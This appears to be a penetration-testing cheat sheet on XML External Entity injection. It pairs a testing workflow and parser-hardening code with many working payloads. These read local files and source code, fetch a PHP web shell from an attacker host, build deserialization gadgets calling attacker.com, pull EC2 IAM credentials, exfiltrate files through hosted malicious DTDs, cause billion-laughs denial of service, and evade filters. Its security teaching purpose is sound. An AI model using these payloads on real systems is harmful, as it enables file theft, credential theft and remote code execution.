# XML External Entity (XXE) Injection

## XXE Testing Workflow

### Map XML Processing Paths

* Identify endpoints that accept XML directly, including SOAP services and APIs that accept `text/xml` or `application/xml`.
* Include file-processing paths that parse XML, such as SVG uploads, office documents, and XML import features. Test both upload and later rendering or conversion paths.
* Include JSON or multipart endpoints that may transform submitted data into XML internally, as well as XML passed through middleware, queues, or background jobs.
* Test each path separately, since different services and file-processing components may use different XML parsers.

### Establish a Baseline

* Send a valid request and record the normal response, status, and any resulting document or application behavior.
* Identify which submitted fields are reflected or processed so the same fields can be compared during the entity tests.

### In-band Entity Testing

* Define an internal entity with a harmless marker such as `XXE_TEST_MARKER` and reference it in a displayed or processed field.
* If the marker appears in the response or resulting document, the parser expanded an internal entity. This does not by itself confirm external entity resolution.

### Out-of-Band Resolution Testing

* Use a unique URL that points only to a tester-controlled callback service as the external entity target.
* Reference the entity in the XML input, then check the callback service for DNS or HTTP interactions associated with the unique URL.
* A callback confirms that the tested parser attempted external resolution. A missing callback alone does not establish that resolution is disabled; correlate the result with parser configuration and application-side observations.

### SOAP XML Testing

* Identify the SOAP envelope and the fields that are processed by the service.
* Run the internal marker and controlled callback checks against the SOAP request body.
* Compare the SOAP response and callback activity with the baseline request to identify which processing layer handled the XML.

<details>

<summary>SOAP Payload</summary>

{% code lineNumbers="true" %}
```http
POST /api/users HTTP/1.1
Host: example.com
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUserInfo>&xxe;</getUserInfo>
  </soap:Body>
</soap:Envelope>
```
{% endcode %}

</details>

### Trace Transformations

* Follow XML data through conversions, serialization, file rendering, and asynchronous processing to identify every component that parses or reparses it.
* Repeat the marker and controlled callback checks at each XML parsing boundary found in the processing path.

### XML and Object Deserialization Testing

* Check whether XML-derived data or uploaded artifacts are later passed to an object-deserialization component.
* In a test environment, use harmless fixtures and instrumentation to verify that processing does not instantiate unexpected object types or trigger file, network, or application-side effects.
* Verify that downstream deserialization uses data-only formats or strict type allowlists and rejects inputs outside the expected schema.

### Verify Parser Behavior

* Verify that external general entities, parameter entities, external DTD loading, and XInclude are disabled when not required.
* Confirm that the application handles rejected XML without returning parser traces or server filesystem paths.
* Add regression tests for each affected XML processing path to confirm external resources are not resolved after the parser configuration is changed.

## How do XXE vulnerabilities arise?

* Applications use the XML format to transmit data between the browser and the server
* XML specification contains dangerous features, and standard parsers support these features
* When XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions.
* Common XML parsers include Java DOM and SAX, Python `xml.etree.ElementTree` and `lxml`, and PHP's libxml. Applications can also invoke these through document processors or third-party libraries.
* External entity behavior depends on the parser, its version, and its configuration. Legacy settings, explicitly enabled features, and third-party configurations can introduce XXE.

<table><thead><tr><th width="110.8568115234375">Key</th><th width="399.428466796875">Definition</th><th>Example</th></tr></thead><tbody><tr><td>Tag</td><td>The keys of an XML document, usually wrapped with (<code>&#x3C;</code>/<code>></code>) characters.</td><td><code>&#x3C;date></code></td></tr><tr><td>Entity</td><td>XML variables, usually wrapped with (<code>&#x26;</code>/<code>;</code>) characters.</td><td><code>&#x26;lt;</code></td></tr><tr><td>Element</td><td>The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.</td><td><code>&#x3C;date>01-01-2022&#x3C;/date></code></td></tr><tr><td>Attribute</td><td>Optional specifications for any element that are stored in the tags, which may be used by the XML parser.</td><td><code>version="1.0"</code>/<code>encoding="UTF-8"</code></td></tr><tr><td>Declaration</td><td>Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.</td><td><code>&#x3C;?xml version="1.0" encoding="UTF-8"?></code></td></tr></tbody></table>

## XML DTD

* **XML Document Type Definition (DTD)** allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file.
* The DTD can be placed within the XML document itself, right after the XML Declaration in the first line. Otherwise, it can be stored in an external file (e.g. `email.dtd`), and then referenced within the XML document with the `SYSTEM` keyword.
* <pre class="language-xml" data-line-numbers><code class="lang-xml">&#x3C;?xml version="1.0" encoding="UTF-8"?>
  &#x3C;!DOCTYPE email SYSTEM "email.dtd">
  &#x3C;!-- OR -->
  &#x3C;?xml version="1.0" encoding="UTF-8"?>
  &#x3C;!DOCTYPE email SYSTEM "http://url/email.dtd">
  </code></pre>

## XML Entities

* We may also define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data which is done using `ENTITY` keyword.
* Entity can be referenced in an XML document between an ampersand `&` and a semi-colon `;` (e.g. `&company;`).
* Whenever an entity is referenced, it will be replaced with its value by the XML parser.
* We can reference External XML Entities with the `SYSTEM` keyword.
* We may also use the `PUBLIC` keyword instead of `SYSTEM` for loading external resources.
* <pre class="language-xml" data-line-numbers><code class="lang-xml">&#x3C;?xml version="1.0" encoding="UTF-8"?>
  &#x3C;!DOCTYPE email [
    &#x3C;!ENTITY company SYSTEM "http://localhost/company.txt">
    &#x3C;!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
  ]>
  </code></pre>
* `% xxe` -> Parameter entity and invoked only within the DTD as `%xxe;`
* `xxe` -> External entity and invoked anywhere as `&xxe;`

## Local File Disclosure <a href="#local-file-disclosure" id="local-file-disclosure"></a>

* #### Identify
  * Find web pages that accept an XML user input.
  * To print the content of an external file to the page, we should note which elements are being displayed, such that we know which elements to inject into.
* #### Exploit
  * If the `DOCTYPE` was already declared in the XML request, we would just add the `ENTITY` element to it.
  * `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
  * `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>`
  * Reference the entity `&xxe;` in any one of the elements.
* Enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like an `id_rsa` SSH key of a specific user, which may grant us access to the back-end server.
* Another benefit of local file disclosure is the ability to obtain the source code of the web application.
* If a file contains some of XML's special characters (e.g. `<`/`>`/`&`), it would break the external entity reference and not be used for the reference. Furthermore, we cannot read any binary data, as it would also not conform to the XML format.
* ### Advanced Exfiltration with CDATA
  * Extract any kind of data (including binary data) for any web application backend.
  * To output data that does not conform to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`).
  * This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.
  * Define a `begin` internal entity with `<![CDATA[`, an `end` internal entity with `]]>`, and then place our external entity file in between, and it should be considered as a `CDATA` element.
  * <pre class="language-xml" data-line-numbers><code class="lang-xml">&#x3C;!DOCTYPE email [
      &#x3C;!ENTITY begin "&#x3C;![CDATA[">
      &#x3C;!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
      &#x3C;!ENTITY end "]]>">
      &#x3C;!ENTITY joined "&#x26;begin;&#x26;file;&#x26;end;">
    ]>
    </code></pre>
  * If we reference the `&joined;` entity, it should contain our escaped data. However, this will not work, since XML prevents joining internal and external entities.
  * To bypass this limitation, we can utilize `XML Parameter Entities`, a special type of entity that starts with a `%` character and can only be used within the DTD.
  * What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined.
  * <pre class="language-xml" data-line-numbers><code class="lang-xml">&#x3C;!-- Create a external DTD File -->
    echo '&#x3C;!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
    &#x3C;!-- Host a Server -->
    python3 -m http.server 8000
    &#x3C;!-- XXE Payload -->
    &#x3C;!DOCTYPE email [
      &#x3C;!ENTITY % begin "&#x3C;![CDATA["> &#x3C;!-- prepend the beginning of the CDATA tag -->
      &#x3C;!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> &#x3C;!-- reference external file -->
      &#x3C;!ENTITY % end "]]>"> &#x3C;!-- append the end of the CDATA tag -->
      &#x3C;!ENTITY % xxe SYSTEM "http://&#x3C;IP>:8000/xxe.dtd"> &#x3C;!-- reference our external DTD -->
      %xxe;
    ]>
    &#x3C;email>&#x26;joined;&#x3C;/email> &#x3C;!-- reference the &#x26;joined; entity to print the file content -->
    </code></pre>
  *

## Remote Code Execution

* The easiest method would be to look for `ssh` keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server.
* Fetch a web shell from our attacker server and writing it to the web app, and then we can interact with it to execute commands.
* `echo '<?php system($_REQUEST["cmd"]);?>' > shell.php` -> `sudo python3 -m http.server 80`
* `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'<IP>/shell.php"> ]>`
* We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax.
* The `expect://` wrapper requires the PHP Expect extension to be installed and enabled.

<details>

<summary>PHP Expect Payload</summary>

{% code lineNumbers="true" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```
{% endcode %}

</details>

### Java Deserialization

* Generate a serialized object using [ysoserial](https://github.com/frohoff/ysoserial):
  * `java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned' > payload.ser`
* Upload `payload.ser` through an attachment endpoint and identify its server-side path:
  * `curl -F 'file=@payload.ser' https://example.com/api/attachments/upload`
  * Example response: `{"file_id":"12345","path":"/app/uploads/12345/payload.ser"}`
* The uploaded object must reach an unsafe deserialization operation such as `ObjectInputStream.readObject()`, with a suitable gadget chain available on the server. A Java serialization stream is binary, and reading it as an XML external entity does not invoke deserialization.
* Java `XMLDecoder` is another deserialization entry point when it processes attacker-controlled object XML.

### PHP PHAR Deserialization

* Create a PHAR with serialized metadata matching a gadget available on the target. For example, the following object assumes the target has an `Exploit` class whose magic method executes its `cmd` property:

<details>

<summary>PHAR Creation</summary>

{% code lineNumbers="true" %}
```php
<?php
class Exploit {
    public $cmd = 'curl http://attacker.com/pwned';
}

$phar = new Phar(__DIR__ . '/exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Exploit());
$phar->stopBuffering();
```
{% endcode %}

</details>

* Save the generator as `create-phar.php` and run `php -d phar.readonly=0 create-phar.php`.
* If an XML parser resolves PHP stream wrappers, reference a file inside an uploaded PHAR archive:

<details>

<summary>PHP PHAR XXE Payload</summary>

{% code lineNumbers="true" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "phar:///var/www/uploads/exploit.phar/test.txt">
]>
<root>&xxe;</root>
```
{% endcode %}

</details>

* Before PHP 8.0, PHAR stream-wrapper operations could automatically deserialize archive metadata. PHP 8.0 and later deserialize metadata through explicit calls such as `Phar::getMetadata()` or `PharFileInfo::getMetadata()`.
* Execution depends on an exploitable class or gadget chain available to the application.

## SSRF attacks

* An HTTP external entity can make the XML parser request internal services and metadata endpoints from the server.
* The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/.
* `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data"> ]>`
* EC2 uses the link-local address `169.254.169.254` for instance metadata.
* IAM role names can be listed at `http://169.254.169.254/latest/meta-data/iam/security-credentials/`; a role's credentials are at `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`.
* IMDSv1 permits metadata GET requests when enabled. IMDSv2 requires a token obtained through a PUT request and included in the metadata request, which a simple external-entity GET does not provide.

### EC2 Metadata and IAM Credentials

* Request the instance metadata root and look for the `iam/` path:

<details>

<summary>Instance Metadata Payload</summary>

{% code lineNumbers="true" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE request [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<request><data>&xxe;</data></request>
```
{% endcode %}

</details>

* Enumerate the IAM role associated with the instance:

<details>

<summary>IAM Role Enumeration Payload</summary>

{% code lineNumbers="true" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE request [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<request><data>&xxe;</data></request>
```
{% endcode %}

</details>

* If the response contains `web-application-role`, use that role name to request its temporary credentials:

<details>

<summary>IAM Credentials Payload</summary>

{% code lineNumbers="true" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE request [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/web-application-role">
]>
<request><data>&xxe;</data></request>
```
{% endcode %}

</details>

* Example credentials response:

<details>

<summary>IAM Credentials Response</summary>

{% code lineNumbers="true" %}
```json
{
  "Code": "Success",
  "AccessKeyId": "ASIA...EXAMPLE",
  "SecretAccessKey": "EXAMPLE_SECRET_ACCESS_KEY",
  "Token": "EXAMPLE_SESSION_TOKEN",
  "Expiration": "2025-12-15T18:30:00Z"
}
```
{% endcode %}

</details>

## DOS Attacks

* <pre class="language-xml" data-line-numbers><code class="lang-xml">&#x3C;?xml version="1.0"?>
  &#x3C;!DOCTYPE email [
    &#x3C;!ENTITY a0 "DOS" >
    &#x3C;!ENTITY a1 "&#x26;a0;&#x26;a0;&#x26;a0;&#x26;a0;&#x26;a0;&#x26;a0;&#x26;a0;&#x26;a0;&#x26;a0;&#x26;a0;">
    &#x3C;!ENTITY a2 "&#x26;a1;&#x26;a1;&#x26;a1;&#x26;a1;&#x26;a1;&#x26;a1;&#x26;a1;&#x26;a1;&#x26;a1;&#x26;a1;">
    &#x3C;!ENTITY a3 "&#x26;a2;&#x26;a2;&#x26;a2;&#x26;a2;&#x26;a2;&#x26;a2;&#x26;a2;&#x26;a2;&#x26;a2;&#x26;a2;">
    &#x3C;!ENTITY a4 "&#x26;a3;&#x26;a3;&#x26;a3;&#x26;a3;&#x26;a3;&#x26;a3;&#x26;a3;&#x26;a3;&#x26;a3;&#x26;a3;">
    &#x3C;!ENTITY a5 "&#x26;a4;&#x26;a4;&#x26;a4;&#x26;a4;&#x26;a4;&#x26;a4;&#x26;a4;&#x26;a4;&#x26;a4;&#x26;a4;">
    &#x3C;!ENTITY a6 "&#x26;a5;&#x26;a5;&#x26;a5;&#x26;a5;&#x26;a5;&#x26;a5;&#x26;a5;&#x26;a5;&#x26;a5;&#x26;a5;">
    &#x3C;!ENTITY a7 "&#x26;a6;&#x26;a6;&#x26;a6;&#x26;a6;&#x26;a6;&#x26;a6;&#x26;a6;&#x26;a6;&#x26;a6;&#x26;a6;">
    &#x3C;!ENTITY a8 "&#x26;a7;&#x26;a7;&#x26;a7;&#x26;a7;&#x26;a7;&#x26;a7;&#x26;a7;&#x26;a7;&#x26;a7;&#x26;a7;">
    &#x3C;!ENTITY a9 "&#x26;a8;&#x26;a8;&#x26;a8;&#x26;a8;&#x26;a8;&#x26;a8;&#x26;a8;&#x26;a8;&#x26;a8;&#x26;a8;">        
    &#x3C;!ENTITY a10 "&#x26;a9;&#x26;a9;&#x26;a9;&#x26;a9;&#x26;a9;&#x26;a9;&#x26;a9;&#x26;a9;&#x26;a9;&#x26;a9;">        
  ]>
  &#x3C;root>
  &#x3C;email>&#x26;a10;&#x3C;/email>
  &#x3C;/root>
  </code></pre>
* However, this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference.

## Blind XXE Vulnerabilities

* **To Exfiltrate Data use 2 Methods**
  * OAST technique using collaborator or [interactsh](https://github.com/projectdiscovery/interactsh) or similar tools
  * By triggering error messages that can contain sensitive data

### Out-of-Band Interaction

* `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http:burpcollaborator"> ]>`
* Invoke `&xxe;` in any of the existing data elements or within the XML document

### Out-of-Band Interaction via XML Parameter Entities

* `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://burpcollaborator" > %xxe; ]>`
* Invoke `%xxe;` within the existing DTD if the above method does not work

### Out-of-band Data Exfiltration <sub>(only if application allows to fetch contents remotely)</sub>

* Create a `malicious.dtd` external DTD file and host it in attacker controlled server to be fetched by victim server
* Payload to be provided in vulnerable application
  * `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker_server.com/malicious.dtd"> %xxe; ]>`
  * `<!DOCTYPE email [ <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd"> %remote; %oob; ]>` <sup><sub>(Aternate Payload)<sub></sup> -> Reference the entity `<root>&content;</root>`

<details>

<summary>Malicious.dtd</summary>

```xml
<!-- OOB Payload
%eval; is supposed to inject a new entity definition (%exfiltrate;).
But many parsers don’t allow parameter entities to define new parameter entities
they stop expansion at one level. -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker-IP/?x=%file; '>">
%eval;
%exfiltrate;
<!-- Alternate Paylaod -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<IP>:8000/?content=%file;'>">
```

</details>

* **Automated OOB Exfiltration**
  * [XXEinjector](https://github.com/enjoiz/XXEinjector) - Supports most of the tricks including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.
  * We can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line <sup><sub>(ie<sub></sup> <sup><sub>`<?xml version="1.0" encoding="UTF-8"?>`<sub></sup><sup><sub>)<sub></sup>, and write `XXEINJECT` after it as a position locator for the tool.
  * `ruby XXEinjector.rb --host=[attacker-IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter`

### Retrieve Data via Error Messages <sub>(only if application allows to fetch contents remotely)</sub>

* Effective only if the application returns the resulting error message within its response
* Try to send malformed XML data, and see if the web application displays any errors. To do so, we delete any of the closing tags, change one of them, so it does not close (e.g. `<roo>` instead of `<root>`), or just reference a non-existing entity.
* Host external DTD `malicious.dtd`
* Payload to be provided in vulnerable application
  * `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker_IP.com/malicious.dtd"> %xxe; ]>`
  * `<!DOCTYPE email [ <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd"> %remote; %error; ]>` <sup><sub>(Alternate Payload)<sub></sup>
* External DTD is only possible because XML parameter entity can be used within the definition of another parameter entity which is not possible in internal DTD

<details>

<summary>Malicious.dtd</summary>

{% code lineNumbers="true" %}
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
<!-- Alternate Payload -->
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
{% endcode %}

</details>

### Repurposing a Local DTD <sub>(if remote fetching of DTD file is not allowed)</sub>

* Exploitable if a document's DTD uses hybrid model (ie internal and external DTD declarations)
* The restriction on using an XML parameter entity within the definition of another parameter entity is relaxed
* External DTD that is local to the application server since out-of-band connections are blocked

## Locating an Existing DTD File to Repurpose

* Here ISOamso is an external entity that is redefined within the internal DTD to trigger an error message that displays the data
* Another location to check is `/usr/share/xml/fontconfig/fonts.dtd`, which may contain a `%constant` entity that can be repurposed.
* [GoSecure/dtd-finder](https://github.com/GoSecure/dtd-finder) finds DTDs and injectable entities in a filesystem snapshot or a comparable installation. Its [DTD and payload lists](https://github.com/GoSecure/dtd-finder/tree/master/list) provide additional locations and examples.

<details>

<summary>Existing Local DTD</summary>

{% code lineNumbers="true" %}
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
{% endcode %}

</details>

<details>

<summary>Modified DTD</summary>

{% code lineNumbers="true" %}
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
{% endcode %}

</details>

## XInclude attacks

* When client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service
* XInclude is a part of the XML specification that allows an XML document to be built from sub-documents.
* Place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document
* Below code is added to a normal application that takes parameters in URL-encoded format (eg: productid=1\&storeid=1)
* Input the payload to productid="payload" -- if the backend server parses this as an XML document the payload gets executed (blind)
* To request an internal HTTP resource, use `<xi:include href="http://internal.company.com/admin" parse="text"/>` with the same XInclude namespace.

<details>

<summary>Payload</summary>

{% code lineNumbers="true" %}
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
{% endcode %}

</details>

## XXE Attacks via File Upload

* XML based formats are office document formats like DOCX and image formats like SVG
* If the above extensions are possible, try uploading an SVG image with malicious payload that gets displayed within the application (profile pic etc.)
* SVG uploads can use `Content-Type: image/svg+xml`; image previews, thumbnail generation, and format conversion can invoke an XML parser.
* Store the below payload as SVG file extension and upload -> output will be as the image

<details>

<summary>SVG Payload</summary>

{% code lineNumbers="true" %}
```svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
        <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>
```
{% endcode %}

</details>

### DOCX Files

* DOCX files are ZIP archives containing XML. Extract a document, edit `word/document.xml`, and repackage the archive while preserving its directory structure.
* Add the `DOCTYPE` after the XML declaration and place `&xxe;` in a `w:t` element that is extracted or displayed by the application.
* `unzip resume.docx -d resume`
* `(cd resume && zip -r ../xxe-resume.docx .)`

<details>

<summary>DOCX XML Payload</summary>

{% code lineNumbers="true" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE w:document [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>Professional Summary: &xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>
```
{% endcode %}

</details>

### XLSX Files

* XLSX files are ZIP archives containing XML such as `xl/workbook.xml` and `xl/sharedStrings.xml`. Modify the XML file processed by the application and repackage the archive.
* [XXElixir](https://github.com/SaFiSec/XXElixir) inserts a supplied XXE declaration into `xl/workbook.xml` and creates a modified XLSX file.
* Ensure the XML declaration occupies the first line of `xl/workbook.xml` and the workbook root starts on a later line; XXElixir inserts the supplied declaration after the first line. Match the `DOCTYPE` name to the workbook root.
* A parameter entity can fetch a remote DTD when the workbook XML is parsed:

<details>

<summary>XXElixir Payload</summary>

{% code lineNumbers="true" %}
```bash
python3 XXElixir.py --file template.xlsx \
  --xxe '<!DOCTYPE workbook [ <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>' \
  --output xxe.xlsx
```
{% endcode %}

</details>

* The remote DTD can contain the file-disclosure or out-of-band payloads described above.
* [Canarytokens](https://canarytokens.org/) Excel tokens can alert when a workbook is opened in Microsoft Excel. Use an external-entity callback separately to test XXE when a server-side library processes the workbook.

## XXE attacks via Modified content type

* POST requests use a default content type that is generated by HTML forms, such as `application/x-www-form-urlencoded`
* Some web sites expect to receive requests in this format but will tolerate other content types, including XML.
* Change the content-type header from `URL-encoded` to `text/xml` or `application/xml` and provide the parameters in XML format.
* If application accepts the XML format, try for XML vulnerability mentioned above.
* If a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm).

## XXE Bypass Techniques

### UTF-16 Encoding

* XML supports multiple encodings, which can bypass filters that inspect only ASCII or UTF-8 bytes.
* Set the XML declaration in `payload.xml` to `<?xml version="1.0" encoding="UTF-16BE"?>` and convert the file:
  * `iconv -f UTF-8 -t UTF-16BE payload.xml > utf16_payload.xml`
* Submit the converted bytes. If specifying a charset in the request, use `Content-Type: application/xml; charset=UTF-16BE`.
* [Evil XML with Two Encodings](https://mohemiv.com/all/evil-xml/) covers additional XML encoding and WAF bypass techniques.

### XML Character Reference Encoding

* Numeric character references in a parameter entity's value are expanded before the replacement text is parsed as a DTD declaration. This can hide a literal file path from a raw-input filter.
* Character references inside a `SYSTEM` identifier itself are not expanded; use them in the containing entity value instead.

<details>

<summary>Encoded Entity Payload</summary>

{% code lineNumbers="true" %}
```xml
<!DOCTYPE root [
  <!ENTITY % encoded "&#x3C;!ENTITY xxe SYSTEM 'file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd'&#x3E;">
  %encoded;
]>
<root>&xxe;</root>
```
{% endcode %}

</details>

### Parameter Entity Indirection

* Host `bypass.dtd` containing `<!ENTITY xxe SYSTEM "file:///etc/passwd">` and load it with a parameter entity.
* This moves the file-reading entity declaration out of the initial request when external DTD loading is permitted.

<details>

<summary>External DTD Payload</summary>

{% code lineNumbers="true" %}
```xml
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "http://attacker.com/bypass.dtd">
  %dtd;
]>
<root>&xxe;</root>
```
{% endcode %}

</details>

## Mitigations

* Avoid Outdated Components
* Disable referencing custom `Document Type Definitions (DTDs)`
* Disable referencing `External XML Entities`
* Disable `Parameter Entity` processing
* Disable support for `XInclude`
* Prevent `Entity Reference Loops`
* Proper exception handling in our web applications and `should always disable displaying runtime errors in web servers`.
* Web Application Firewalls (WAFs) is another layer of protection against XXE exploitation.
* Restrict outbound access and use least-privilege filesystem and cloud permissions.

### Parser Configuration

<details>

<summary>Java DocumentBuilderFactory</summary>

{% code lineNumbers="true" %}
```java
import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
factory.setXIncludeAware(false);
DocumentBuilder builder = factory.newDocumentBuilder();
```
{% endcode %}

</details>

<details>

<summary>Python defusedxml</summary>

{% code lineNumbers="true" %}
```python
from defusedxml import ElementTree

tree = ElementTree.parse("untrusted.xml", forbid_dtd=True)
```
{% endcode %}

</details>

<details>

<summary>PHP libxml</summary>

{% code lineNumbers="true" %}
```php
<?php
if (!libxml_set_external_entity_loader(static function () {
    return null;
})) {
    throw new RuntimeException('Unable to disable external entity loading');
}

$document = new DOMDocument();
$document->resolveExternals = false;
$document->substituteEntities = false;
if (!$document->loadXML($xml, LIBXML_NONET)) {
    throw new RuntimeException('Invalid XML');
}
```
{% endcode %}

</details>

* Apply the appropriate settings to every XML parsing, validation, and transformation component. See the [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) for parser-specific settings.

| XQuery Injection | `'` `;` `--` `/* */`                              |
| ---------------- | ------------------------------------------------- |
| XPath Injection  | `'` `or` `and` `not` `substring` `concat` `count` |
